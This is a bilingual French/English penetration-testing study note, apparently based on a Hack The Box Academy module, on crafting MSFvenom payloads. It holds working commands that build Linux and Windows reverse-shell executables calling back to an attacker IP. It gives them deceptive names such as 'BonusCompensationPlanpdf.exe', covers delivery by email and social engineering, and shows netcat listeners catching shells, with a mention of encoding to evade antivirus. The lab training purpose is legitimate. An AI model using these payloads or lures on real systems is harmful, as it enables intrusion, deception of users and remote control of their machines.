# Crafting Payloads with MSFvenom

***

Une méthode consiste à utiliser **MSFvenom**, un outil qui permet de créer des payloads personnalisés que l'on peut envoyer par des moyens comme un email ou des techniques d'ingénierie sociale, incitant ainsi l'utilisateur à exécuter le fichier.

**MSFvenom** offre aussi la possibilité de chiffrer et d'encoder les payloads pour contourner les antivirus et autres systèmes de détection de signature malveillante. Cela permet de livrer des payloads de manière plus discrète et efficace.

***

### <mark style="color:red;">Practicing with MSFvenom</mark>

In Pwnbox or any host with MSFvenom installed, we can issue the command `msfvenom -l payloads` to list all the available payloads.&#x20;

<mark style="color:green;">**List Payloads**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ msfvenom -l payloads
```
{% endcode %}

***

### <mark style="color:red;">Staged vs. Stageless Payloads</mark>

#### <mark style="color:green;">Payloads avec étapes (Staged)</mark>

Les payloads avec étapes fonctionnent en deux parties. D'abord, une petite portion du **payload** est envoyée à la cible. Une fois cette première étape exécutée, cette partie fait appel à l'ordinateur de l'attaquant pour télécharger le reste du payload via le réseau. Par exemple, dans le cas d’un **payload** comme `linux/x86/shell/reverse_tcp`, la première étape consiste à envoyer un morceau qui établit une connexion entre la cible et l'attaquant. Ensuite, la cible télécharge et exécute le reste du code pour ouvrir une "reverse shell" (une connexion permettant à l'attaquant de contrôler la cible).

L’avantage des **payloads staged** est qu'ils permettent d'envoyer de petites portions au début, ce qui peut être utile pour les systèmes avec des restrictions de mémoire. Cependant, cela peut aussi rendre la connexion instable si le réseau est lent ou si le système cible n’a pas assez de mémoire pour gérer plusieurs étapes.

#### <mark style="color:green;">Payloads sans étapes (Stageless)</mark>

Les **payloads stageless**, quant à eux, n’ont pas de plusieurs étapes. Tout le **payload** est envoyé d'un coup et exécuté immédiatement sur la cible. Par exemple, avec un **payload** comme `linux/zarch/meterpreter_reverse_tcp`, tout le code nécessaire pour établir la connexion et prendre le contrôle de la machine est envoyé en une seule fois, sans étapes intermédiaires.

Les **payloads stageless** sont souvent plus stables dans des environnements où la connexion réseau est lente ou instable, car ils ne dépendent pas d'étapes multiples et de connexions répétées. De plus, ils peuvent parfois mieux échapper aux systèmes de détection, car ils génèrent moins de trafic réseau.

This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering.

#### Comment identifier un payload staged ou stageless ?

Dans Metasploit, le nom du payload peut souvent indiquer s'il est staged ou stageless. Par exemple :

* `windows/meterpreter/reverse_tcp` est un **payload staged**. On peut le voir car le nom est divisé en plusieurs parties (ou "étapes") par des barres obliques (`/`).
* `windows/meterpreter_reverse_tcp` est un **payload stageless**, car tout est réuni en une seule partie.

En résumé :

* **Staged** : envoie un petit morceau qui télécharge le reste plus tard.
* **Stageless** : envoie tout d'un coup.

Les **payloads stageless** sont plus simples et peuvent être utiles quand les conditions réseau sont mauvaises, tandis que les **payloads staged** sont parfois préférables pour contourner des restrictions sur la taille des fichiers ou la mémoire.

***

### <mark style="color:red;">Building A Stageless Payload</mark>

Now let's build a simple stageless payload with msfvenom and break down the command.

<mark style="color:green;">**Build It**</mark>

{% code fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
{% endcode %}

<mark style="color:green;">**Call MSFvenom**</mark>

```shell-session
msfvenom
```

Defines the tool used to make the payload.

<mark style="color:green;">**Creating a Payload**</mark>

```shell-session
-p 
```

This `option` indicates that msfvenom is creating a payload.

<mark style="color:green;">**Choosing the Payload based on Architecture**</mark>

```shell-session
linux/x64/shell_reverse_tcp 
```

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

<mark style="color:green;">**Address To Connect Back To**</mark>

```shell-session
LHOST=10.10.14.113 LPORT=443 
```

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).

<mark style="color:green;">**Format To Generate Payload In**</mark>

```shell-session
-f elf 
```

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

**Output**

```shell-session
> createbackup.elf
```

Creates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.

***

### <mark style="color:red;">Executing a Stageless Payload</mark>

* Email message with the file attached.
* Download link on a website.
* Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
* Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.

**Ubuntu Payload**

![image](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)

We would have a listener ready to catch the connection on the attack box side upon successful execution.

<mark style="color:green;">**NC Connection**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443
```

When the file is executed, we see that we have caught a shell.

<mark style="color:green;">**Connection Established**</mark>

```bash
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

This same concept can be used to create payloads for various platforms, including Windows.

***

### <mark style="color:red;">Building a simple Stageless Payload for a Windows system</mark>

We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.

<mark style="color:green;">**Windows Payload**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
mrroboteLiot@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
{% endcode %}

The command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.

***

### <mark style="color:red;">Executing a Simple Stageless Payload On a Windows System</mark>

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.

![image](https://academy.hackthebox.com/storage/modules/115/winpayload.png)

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

```bash
mrroboteLiot@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes fre
```
